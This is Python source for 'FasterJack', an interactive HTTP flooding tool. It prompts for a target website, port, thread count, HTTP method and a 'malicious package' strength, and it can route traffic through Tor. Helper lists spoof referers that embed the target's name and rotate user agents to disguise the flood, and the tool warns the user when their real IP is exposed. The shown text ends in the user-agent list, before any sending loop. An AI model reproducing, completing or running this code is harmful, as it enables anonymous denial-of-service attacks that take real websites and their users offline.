#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#By Neo-Jack
#chmod +x fasterjack.py
# Run as ./fasterjack.py

import config as conf
language = conf.language_conf
if language == "es":
    from language import leng_es as idioma
    pass
elif language == "en":
    from language import leng_en as idioma
    pass
elif language == "pt":
    from language import leng_pt as idioma
    pass
elif language == "default":
    from language import leng_default as idioma
    pass
else:
    from language import leng_default as idioma
    pass
parametros_defecto_leng = idioma.parametros_defecto_leng
asociado_puerto_leng = idioma.asociado_puerto_leng
obligatorio_leng = idioma.obligatorio_leng
web_leng = idioma.web_leng
puerto_leng = idioma.puerto_leng
clientes_leng = idioma.clientes_leng
metodo_leng = idioma.metodo_leng
desactivado_leng = idioma.desactivado_leng
or_leng = idioma.or_leng
para_salir_leng = idioma.para_salir_leng
agente_asignado_conf = conf.agente_asignado_conf 
asignando_nuevo_conf = conf.asignando_nuevo_conf
activar_leng = idioma.activar_leng
activado_leng = idioma.activado_leng
adios_leng = idioma.adios_leng
asignando_nuevo_leng = idioma.asignando_nuevo_leng
basic_txt = idioma.basic_txt
bots_verificadores_leng = idioma.bots_verificadores_leng
conectando_conf = conf.conectando_conf
clientes_conf = conf.clientes_conf
port_conf_txt = conf.port_conf
cli_txt = idioma.cli_txt
cuantos_clientes_leng = idioma.cuantos_clientes_leng
comprobando_info_leng = idioma.comprobando_info_leng
comprobando_leng = idioma.comprobando_leng
clientes2_leng = idioma.clientes2_leng
conectando_cliente_leng = idioma.conectando_cliente_leng
caido_protegido_leng = idioma.caido_protegido_leng
desactivar_leng = idioma.desactivar_leng
desactivado2_leng = idioma.desactivado2_leng
defecto_leng = idioma.defecto_leng
ej_leng = idioma.ej_leng
ejemplo_leng = idioma.ejemplo_leng
estado_leng = idioma.estado_leng
error500_leng = idioma.error500_leng
forzar_agente_conf = conf.forzar_agente_conf
forzar_identidad = idioma.forzar_identidad
forzando_leng = idioma.forzando_leng
host_cerrado_leng = idioma.host_cerrado_leng
inexistente_leng = idioma.inexistente_leng
intentalo_leng = idioma.intentalo_leng
iniciando_leng = idioma.iniciando_leng
ip_asignada_leng = idioma.ip_asignada_leng
ip_segura_leng = idioma.ip_segura_leng
ip_expuesta_leng = idioma.ip_expuesta_leng
imp_hand_leng = idioma.imp_hand_leng
loading_leng = idioma.loading_leng
malicious_package = idioma.malicious_package
me_txt = idioma.me_txt
metodos2_leng = idioma.metodos2_leng
metodo2_leng = idioma.metodo2_leng
nueva_ip_asignada = conf.nueva_ip_asignada
obligatorio_leng2 = idioma.obligatorio_leng2
no_tor_instalado_leng = idioma.no_tor_instalado_leng
nuevo_agente_leng = idioma.nuevo_agente_leng
nueva_ip_asignada = idioma.nueva_ip_asignada
o_leng = idioma.o_leng
opciones_leng = idioma.opciones_leng

package_conf = conf.package_conf
package_send_it_conf = conf.package_send_it_conf
puerto_a_usar_leng = idioma.puerto_a_usar_leng
paquete_enviado_leng = idioma.paquete_enviado_leng
paquete_recepcionado_leng = idioma.paquete_recepcionado_leng
paquete_timeout_leng = idioma.paquete_timeout_leng
paquete_bloqueado_leng = idioma.paquete_bloqueado_leng
paquete_no_enviado = idioma.paquete_no_enviado
para_terminar_leng = idioma.para_terminar_leng
puerto2_leng = idioma.puerto2_leng
puerto_no_leng = idioma.puerto_no_leng
quesitio_web_leng = idioma.quesitio_web_leng
que_puerto_leng = idioma.que_puerto_leng
quiere_activar_tor_leng = idioma.quiere_activar_tor_leng
reconectando_conf = conf.reconectando_conf
respuesta_valida_leng = idioma.respuesta_valida_leng
recomendado_leng = idioma.recomendado_leng
reconectando_leng = idioma.reconectando_leng
strong_txt = idioma.strong_txt
seleccione_metodo_leng = idioma.seleccione_metodo_leng
seguridad_ip_leng = idioma.seguridad_ip_leng
servidor_ip_leng = idioma.servidor_ip_leng
seguro_continuar_leng = idioma.seguro_continuar_leng
s_leng = idioma.s_leng
tor_txt = idioma.tor_txt
target_desconosido_leng = idioma.target_desconosido_leng
target_leng = idioma.target_leng
ultima_oportunidad_leng = idioma.ultima_oportunidad_leng
use_vpn_leng = idioma.use_vpn_leng
uagent_leng = idioma.uagent_leng
verif_host_conf = conf.verif_host_conf
ventana_cierra_leng = idioma.ventana_cierra_leng
verificando_leng = idioma.verificando_leng
verifique_leng = idioma.verifique_leng
web_ip = idioma.web_ip
web_invalido_leng = idioma.web_invalido_leng
window = idioma.window
pu = "\n ---------------------------------------------------- \n"
check_pip_config  = conf.check_pip_config 
if check_pip_config == "yes":
    from libraries import modules as lib
    revisar_pip_leng = idioma.revisar_pip_leng
    lib.clear()
    print( pu + revisar_pip_leng + "." + pu)
    lib.pip_inst()
    lib.clear()
else:
    pass
check_tor_config = conf.check_tor_conf
if check_tor_config == "yes":
    from libraries import TorExpertBundle as torEX
    from libraries import modules as lib
    revisar_tor_leng = idioma.revisar_tor_leng
    lib.clear()
    print( pu + revisar_tor_leng + "." + pu)
    torEX.tor_inst()
    torEX.torsocks_inst()
    torEX.torgeoipdb_inst()
    torEX.tor_run()
    torEX.apt_transport_https()
    lib.clear()
else:
    pass
check_libraries = conf.check_libraries_conf
if check_libraries == "yes":
    from libraries import modules as lib
    revisar_leng = idioma.revisar_leng
    lib.clear()    
    print( pu + revisar_leng + "." + pu)    
    lib.threading_lib()
    lib.random_lib()
    lib.requests_lib()
    lib.socks_lib()
    lib.socket_lib()
    lib.sys_lib()
    lib.colorama_lib()
    lib.queue_lib()
    lib.time_lib()
    lib.urllib_lib()
    lib.optparse_lib()
    lib.clear()
    pass
elif check_libraries == "no":
    pass
else:
    from libraries import modules as lib
    revisar_leng = idioma.revisar_leng
    lib.clear()
    pu = "\n ---------------------------------------------------- \n"
    print( pu + revisar_leng + "." + pu)
    lib.pip_inst()
    lib.threading_lib()
    lib.random_lib()
    lib.requests_lib()
    lib.socks_lib()
    lib.socket_lib()
    lib.sys_lib()
    lib.colorama_lib()
    lib.queue_lib()
    lib.time_lib()
    lib.urllib_lib()
    lib.optparse_lib()
    lib.clear()
    pass
from colorama import Fore, Back, Style
from queue import Queue
from optparse import OptionParser
from libraries import modules as lib
import time
import sys
import socket
import socks
import requests
import threading
import urllib.request
import random
from os import system, name
import os

ipcheck_url1_conf = conf.ipcheck_url1_conf
ipcheck_url2_conf = conf.ipcheck_url2_conf
ipcheck_url3_conf = conf.ipcheck_url3_conf
ipcheck_url4_conf = conf.ipcheck_url4_conf
ipcheck_url5_conf = conf.ipcheck_url5_conf
ipcheck_url6_conf = conf.ipcheck_url6_conf
ipcheck_url7_conf = conf.ipcheck_url7_conf
bot_url1_conf = conf.bot_url1_conf
bot_url2_conf = conf.bot_url2_conf
bot_url3_conf = conf.bot_url3_conf
bot_url4_conf = conf.bot_url4_conf
bot_url5_conf = conf.bot_url5_conf
headers_conf = conf.headers_conf
BC = Back.CYAN
BM = Back.MAGENTA
BR = Back.RED
FB = Fore.BLUE
FC = Fore.CYAN
FG = Fore.GREEN
FM = Fore.MAGENTA
FR = Fore.RED
FW = Fore.WHITE
FY = Fore.YELLOW
SB = Style.BRIGHT
SD = Style.DIM
SR = Style.RESET_ALL
aa = FB + BM + SB
bb = FW + BM + SB
cc = FG + BM + SB
dd = FY + BM + SB
ee = FM + SB 
ff = FW + SB 
gg = FY + SB 
hh = SR + FB + SB
jj = FR + SB 
kk = FW + BR + SB 
ll = FB + SB 
mm = SR + ff
nn = SR + jj
sb = SR + bb
oo = sb + FG + SB
pp = SR + ee
qq = sb + ff
rr = hh + SR
ss = FC + SB 
tt = FG + SB 
ix = SR + FG + SB
ec = SR + cc
sg = SR + gg
timeout = int(10)
def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

clear()
iniciando = "FasterJack 2.4 by NeoJack" # version
ini_pro = iniciando.center(50)
ini_win = window.center(50)
by = "JUL/2020"                         # Fecha
ini_by = by.center(50)
print(aa + "....................................................." + SR)
print(bb + ini_pro + "   " + SR)
print(aa + "....................................................." + SR)
print(cc + ini_win + "   " + SR)
print(cc + ini_by + "   " + SR)
print(BM + "                                                     " + SR )
print(BM + "                                                     \n" + SR)
print(aa + "....................................................." + SR)
pa_txt = gg + "1" + ll + "/6"
cen_web = web_ip.center(50)
print(cc + pa_txt + cen_web + SR)
print(aa + "....................................................." + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + obligatorio_leng2 + "...\n" + SR)
host = input(ee + "¿...?: " + sg + quesitio_web_leng + ": " + hh + ej_leng + ": "  + ix + "[www." + ejemplo_leng + ".com]" + " \n" + SR)
if host == "":
    host = "ERROR"
while (host):    
    try:
        if host == "ERROR":
            clear()
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + jj + "Error --> " + hh + inexistente_leng + SR)
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + web_invalido_leng + "...\n" + SR)
            host = input(ee + "¿...?: " + sg + quesitio_web_leng + ": " + hh + ej_leng + ": "  + ix + "[www." + ejemplo_leng + ".com]" + " \n" + SR)
        if host == "":
            clear()
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + jj + "Error --> " + hh + intentalo_leng + "!!!" + SR)
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + web_invalido_leng + "...\n" + SR)
            host = input(ee + "¿...?: " + sg + quesitio_web_leng + ": " + hh + ej_leng + ": "  + ix + "[www." + ejemplo_leng + ".com]" + " \n" + SR)
        if host != "":
            break
        else:
            clear()
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + jj + "Error --> " + hh + target_desconosido_leng + SR)
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + web_invalido_leng + "...\n" + SR)
            host = input(ee + "¿...?: " + sg + quesitio_web_leng + ": " + hh + ej_leng + ": "  + ix + "[www." + ejemplo_leng + ".com]" + " \n" + SR)
            if host == "":
                host = "ERROR"
    except:
        clear()
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + jj + "Error --> " + hh + ultima_oportunidad_leng + "!!!" + SR)
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + web_invalido_leng + "...\n" + SR)
        host = input(ee + "¿...?: " + sg + quesitio_web_leng + ": " + hh + ej_leng + ": "  + ix + "[www." + ejemplo_leng + ".com]" + " \n" + SR)
if host == "ERROR":
    print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + jj + "Error --> " + hh + inexistente_leng + SR)
    print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + kk + adios_leng + SR)
    sys.exit()
clear()
print(aa + "....................................................." + SR)
port_txt = puerto_a_usar_leng + ": " + " 80 " + o_leng + " 443"
pa_txt = gg + "2" + ll + "/6"
cen_port = port_txt.center(50)
print(aa + pa_txt + cen_port + SR)
print(aa + "....................................................." + SR)
if port_conf_txt == "80":
    port_conf_txt = "80"
elif port_conf_txt == "443":
    port_conf_txt = "443"
else:
    port_conf_txt = "80"
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + defecto_leng + ": " + ix + "[" + port_conf_txt + "]\n" + SR)
port = input(ee + "¿...?: " + sg + que_puerto_leng + ": " + hh + opciones_leng + ": " + ix + "[80]" + hh + " o " + ix + "[443]\n" + SR)
if port == "":
    port = conf.port_conf
while (port):
    try:
        if port == "80":
            port = "80"
            break
        if port == "443":
            port = "443"
            break
        if port == "":
            port = conf.port_conf
            break
        else:
            port = ("80")
    except:
        port = conf.port_conf
if port == "443":
    port = str("443")
    http = str("https://")
else:
    port = str("80")
    http = str("http://")
clear()
print(aa + "....................................................." + SR)
pa_txt = gg + "3" + ll + "/6"
cen_tor = tor_txt.center(50)
print(aa + pa_txt + cen_tor + SR)
print(aa + "....................................................." + SR)
tor1_txt_conf = conf.Tor_conf
if tor1_txt_conf == "off":
    tor1_txt_conf = desactivado2_leng
elif tor1_txt_conf == "on":
    tor1_txt_conf = activado_leng
else:
    tor1_txt_conf = desactivado2_leng    
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + defecto_leng + ": " + sg + tor1_txt_conf + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + respuesta_valida_leng + ": " + ix + "[1] " + hh + o_leng + ix + " [2]" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + ej_leng + ": " + ix + "[1]" + hh + " --> " + sg + desactivar_leng + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + ej_leng + ": " + ix + "[2]" + hh + " --> " + sg + activar_leng + "\n" + SR)
Tor = input(ee + "¿...?: " + sg + quiere_activar_tor_leng + ": " + hh + opciones_leng + ": " + ix + "[1]" + hh + " o " + ix + "[2]\n" + SR)
if Tor == "":
    tor1_conf = conf.Tor_conf
    if tor1_conf == "off":
        Tor = "1"
        pass
    elif tor1_conf == "on":
        Tor = "2"
        pass
    else:
        Tor = "1"
        pass
while (Tor):
    try:
        if Tor == "1":
            Tor = "1"
            break
        if Tor == "2":
            Tor = "2"
            break
        if Tor == "":
            tor1_conf = congf.Tor_conf
            if tor1_conf == "off":
                Tor = "1"
                break
            elif tor1_conf == "on":
                Tor = "2"
                break
            else:
                Tor = "1"
        else:
            Tor = "1"
    except:
        Tor = ("1")
if Tor == "2":
    tor = True
else:
    tor = False
lib.host = host
clear()
print(aa + "....................................................." + SR)
pa_txt = gg + "4" + ll + "/6"
cen_cli = cli_txt.center(50)
print(aa + pa_txt + cen_cli + SR)
print(aa + "....................................................." + SR)
clientes_txt_conf = conf.clientes_conf
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + defecto_leng + ": " + ix + "[" + clientes_txt_conf + "]" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + recomendado_leng + ": " + ix + "[30 - 135]\n" + SR)
Thr = input(ee + "¿...?: " + sg + cuantos_clientes_leng + " " + hh + ej_leng + ": " + ix + "[90] \n" + SR)
if Thr == "":
    Thr = clientes_conf
    thr = Thr
else:
    thr = Thr
#####################################    
clear()
print(aa +  "....................................................." + SR)
pa_txt = gg + "5" + ll + "/6"
cen_me = me_txt.center(50)
print(aa + pa_txt + cen_me + SR)
print(aa + "....................................................." + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + metodos2_leng + ": " + sg + "Random , Get, Post" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + respuesta_valida_leng + ": " + ix + "[1]" + hh + ", " + ix + "[2]" + hh + ", " + ix + "[3]" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + ej_leng + ": "  + ix + "[1]" + hh + " --> " + sg + "Random" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + ej_leng + ": "  + ix + "[2]" + hh + " --> " + sg + "Get" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + ej_leng + ": "  + ix + "[3]" + hh + " --> " + sg + "Post" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + ej_leng + ": "  + ix + "[4]" + hh + " --> " + sg + "Delete" + SR)
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + ej_leng + ": "  + ix + "[5]" + hh + " --> " + sg + "Trace\n" + SR)
Met = input(ee + "¿...?: " + sg + seleccione_metodo_leng + " " + hh + opciones_leng + ": " + ix + "[1] " + hh + o_leng + ix + " [2] " + hh + o_leng + ix + " [3]" + hh + o_leng + ix + " [4]\n" + SR)
if Met == "":
    met = "Random"
elif Met == "1" or Met == "random" or Met == "RANDOM" or Met == "Random":
    met = "Random"
elif Met == "2" or Met == "get" or Met == "GET" or Met == "Get":
    met = "GET"
elif Met == "3" or Met == "post" or Met == "POST" or Met == "Post":
    met = "POST"
elif Met == "4" or Met == "delete" or Met == "Delete" or Met == "DELETE":
    met = "DELETE"
elif Met == "5" or Met == "trace" or Met == "Trace" or Met == "TRACE":
    met = "TRACE"
else:
    met = "Random"
    
#################################
# Paquete Malisioso
clear()
# Portada
print(aa +  "....................................................." + SR)
pac_txt = "Seleccione el tipo de Paquete Malicioso"
pa_txt = gg + "6" + ll + "/6"
cen_pac = pac_txt.center(50)
print(aa + pa_txt + cen_pac + SR)
print(aa + "....................................................." + SR)
# tomando variable de config.py
if package_conf == "basic" or package_conf == "Basic" or package_conf == "b" or package_conf == "B" or package_conf == "BASIC":
    package_conf = "basic"
elif package_conf == "normal" or package_conf == "Normal" or package_conf == "n" or package_conf == "N" or package_conf == "NORMAIL":
    package_conf = "normal"
elif package_conf == "strong" or package_conf == "Strong" or package_conf == "s" or package_conf == "S" or package_conf == "STRONG":
    package_conf = "strong"
else:
    package_conf = "normal"

#menu
print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + "Defecto: " + ix + "[" + package_conf + "]\n" + SR)
#
package_num  =  input(ee + "¿...?: " + sg + "Seleccione el tipo de Paquete?" + " " + hh + "Opciones: " + ix + "[1] " + hh + o_leng + ix + " [2] " + hh + o_leng + ix + " [3]\n" + SR)

if package_num == "":
    package_conf = conf.package_conf

while (package_num):
    try:
        if package_num == "1" or package_num == "basic" or package_num == "Basic" or package_num == "BASIC" or package_num == "b" or package_num == "B":
            package_conf = "basic"
            break
        elif package_num == "2" or package_num == "normal" or package_num == "Normal" or package_num == "NORMAL" or package_num == "n" or package_num == "N":
            package_conf = "normal"
            break
        elif package_num == "3" or package_num == "strong" or package_num == "Strong" or package_num == "STRONG" or package_num == "s" or package_num == "S":  
            package_conf = "strong"  
            break
        elif package_num == "":
            package_conf = conf.package_conf
            break
        else:
            package_num = "2"
    except:
        package_conf = conf.package_conf

#################################    
    
http
host
port
thr
met
tor
lis = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_%'

def pre():    
    clear()
    print("")
    print(bb + "....................................................." + SR)
    st_txt = iniciando_leng + "... FasterJack"
    cen_st = st_txt.center(50)
    print(dd + cen_st + "   " + SR)
    print(cc + " " + para_salir_leng + " -->" + qq + " [Ctrl + C] " + oo + or_leng + qq + " [Ctrl + Z]            " + SR)
    print(bb + ".....................................................\n" + SR)
    
    if tor is True:
        torinfo = str(activado_leng)
    else:
        torinfo = str(desactivado2_leng)
    print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + comprobando_info_leng + "..." + SR)
    time.sleep(.1)
    if package_conf == "basic" or package_conf == "Basic" or package_conf == "BASIC":
        package_conf_txt = basic_txt
        print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + malicious_package + ": " + SR + ss + package_conf_txt + SR)
    if package_conf == "normal" or package_conf == "Normal" or package_conf == "Normal":
        package_conf_txt = "Normal"
        print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + malicious_package + ": " + SR + ee + package_conf_txt + SR)
    if package_conf == "strong" or package_conf == "Strong" or package_conf == "STRONG":
        package_conf_txt = strong_txt
        print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + malicious_package + ": " + SR + jj + package_conf_txt + SR)
    
    if torinfo == str(desactivado2_leng):
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + "Tor" + ": " + nn + str(torinfo) + SR)        
    else:
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + "Tor" + ": " + ix + str(torinfo) + SR)        
def mix_metodo():    
    global mmetodo
    mmetodo = []
    mmetodo.append("GET")
    mmetodo.append("POST")
    mmetodo.append("DELETE")
    mmetodo.append("TRACE")    
    return(mmetodo)
    
def my_bots():	
	global bots
	bots = []
	bots.append(bot_url1_conf)
	bots.append(bot_url2_conf)
	bots.append(bot_url3_conf)
	bots.append(bot_url4_conf)
	bots.append(bot_url5_conf)
	return(bots)

def ipchecker_url():    
    global multichecker
    multichecker = []
    multichecker.append(ipcheck_url1_conf)
    multichecker.append(ipcheck_url2_conf)
    multichecker.append(ipcheck_url3_conf)
    multichecker.append(ipcheck_url4_conf)
    multichecker.append(ipcheck_url5_conf)
    multichecker.append(ipcheck_url6_conf)
    multichecker.append(ipcheck_url7_conf)    
    return(multichecker)
    
def referer_url():
    global referer
    referer = []
    referer.append(http + host)
    referer.append("https://boardreader.com/s/" + host + ".html")
    referer.append("https://www.ecosia.org/search?q=" + host)
    referer.append("https://www.qwant.com/?q=" + host)
    referer.append("https://gibiru.com/results.html?q=" + host)
    referer.append("https://www.baidu.com/s?wd=" + host)
    referer.append("https://www.wolframalpha.com/input/?i=" + host)
    referer.append("http://www.google.com/?q=" + host)
    referer.append("http://www.google.com/")
    referer.append("http://www.yahoo.com/")
    referer.append("https://search.yahoo.com/search?p=" + host)
    referer.append("https://www.facebook.com/")
    referer.append("https://www.instagram.com/")
    referer.append("https://www.fbi.com/")
    referer.append("https://www.bing.com/search?q=" + host)
    referer.append("https://www.bing.com/")
    referer.append("https://duckduckgo.com/")
    referer.append("https://duckduckgo.com/?q=" + host)
    referer.append("https://www.twitter.com/")
    referer.append("https://es.ask.com/")
    referer.append("https://es.ask.com/web?q=" + host)
    referer.append("https://www.wolframalpha.com/")
    referer.append("https://www.wolframalpha.com/input/?i=" + host)
    referer.append("https://www.ecosia.org/")
    referer.append("https://www.ecosia.org/search?q=" + host)
    referer.append("https://www.dogpile.com/")
    referer.append("https://www.dogpile.com/serp?q=" + host)
    referer.append("https://gibiru.com/")
    referer.append("https://gibiru.com/results.html?q=" + host)
    referer.append("https://swisscows.com/")
    referer.append("https://swisscows.com/web?query=" + host)
    referer.append("https://www.exalead.com/search/web/")
    referer.append("https://www.exalead.com/search/web/results/?q=" + host)
    referer.append("https://www.kiddle.co/")
    referer.append("https://www.kiddle.co/s.php?q=" + host)
    referer.append("https://www.lycos.es/")
    referer.append("https://search.lycos.es/web/?q=" + host)
    referer.append("https://www.metacrawler.com/")
    referer.append("https://www.metacrawler.com/serp?q=" + host)
    referer.append("https://peekier.com/")
    referer.append("https://peekier.com/#!" + host)
    referer.append("https://www.qwant.com/")
    referer.append("https://www.qwant.com/?q=" + host)
    referer.append("https://www.webcrawler.com/")
    referer.append("https://www.webcrawler.com/serp?q=" + host)
    referer.append("https://www.yippy.com/")
    referer.append("https://www.yippy.com/search?query=" + host)
    return(referer)
def conec_tor():
    if tor is True:
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + comprobando_leng + ": " + mm + seguridad_ip_leng + SR)        
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket        
        try:            
            ip_checker = random.choice(multichecker)
            tor_ip = requests.get(str(ip_checker))
            tor_ip = str(tor_ip.text)
            print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + servidor_ip_leng + ": " + mm + " --> " + ix + ip_checker + rr)
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + estado_leng + ": " + ip_asignada_leng + SR)
            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + ip_segura_leng + ": " + mm + tor_ip + SR)            
        except requests.exceptions.ConnectionError as errc:
            ip_checker = random.choice(multichecker)
            tor_ip = requests.get(str(ip_checker))
            tor_ip = str(tor_ip.text)
            print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + servidor_ip_leng + ": " + mm + " --> " + ix + ip_checker + rr)
            print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + estado_leng + ": " + ip_asignada_leng + SR)
            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + ip_segura_leng + ": " + mm + tor_ip + SR)            
        except requests.exceptions.RequestException as e:
            print(no_tor_instalado_leng)
            print(ventana_cierra_leng)
            time.sleep(7)
            sys.exit(0)
    if tor is False:
        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + comprobando_leng + ": " + mm + seguridad_ip_leng + SR)              
        try:
            ip_checker = random.choice(multichecker)
            regular_ip = requests.get(str(ip_checker))            
            regular_ip = str(regular_ip.text)
            print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + servidor_ip_leng + ": " + mm + " --> " + ix + ip_checker + rr)
            print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + ip_expuesta_leng + ": " + mm + regular_ip + SR)            
            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + nn + "--> " + SR  + gg + use_vpn_leng + ".\n" + SR)
            continuar()
        except requests.exceptions.ConnectionError as errc:
            ip_checker = random.choice(multichecker)
            regular_ip = requests.get(str(ip_checker))
            regular_ip = str(regular_ip.text)
            print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + servidor_ip_leng + ": " + mm + " --> "  + ix + ip_checker + rr)
            print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + ip_expuesta_leng + ": " + mm + regular_ip + SR)            
            print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + nn + "--> " + sg + use_vpn_leng + ".\n" + SR)
            continuar()
        except requests.exceptions.RequestException as e:
            sys.exit(0)

def continuar():
    cont = input(ee + "¿...?: " + hh + " " + seguro_continuar_leng + " [" + ix + s_leng + hh + "] / [" + nn + "n" + hh + "]\n" + SR)
    if cont is None:
        print("n")
        sys.exit()
    if cont == s_leng or cont == "s" or cont == "si" or cont == "S" or cont == "Si" or cont == "SI" or cont == "y" or cont == "yes" or cont == "Y" or cont == "Yes" or cont == "YES":
        pass
    else:
        print("n")
        sys.exit()
        
def user_agent():    
    global uagent
    uagent = []
    uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)")
    uagent.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")	
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)")
    uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)")	
    uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Neo/20100804 Gentoo Firefox/3.6.8")
    uagent.append("X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7")
    uagent.append("YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/")
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1")
    uagent.append("Mozilla/5.0 (Windows NT 5.1; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1")
    uagent.append("Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.17) Gecko/20080829 Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2a1pre) Gecko/20090322 Fennec/1.0b2pre")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.723+ (Firefox compatible)")
    uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.443+ (Firefox compatible)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20130628 Camino/3.245.226 (MultiLang) (like Firefox/3.621.218)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.93.26.2658) Gecko/20141026 Camino/2.176.223 (MultiLang) (like Firefox/3.64.2268)0")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre) Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre)   Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)")
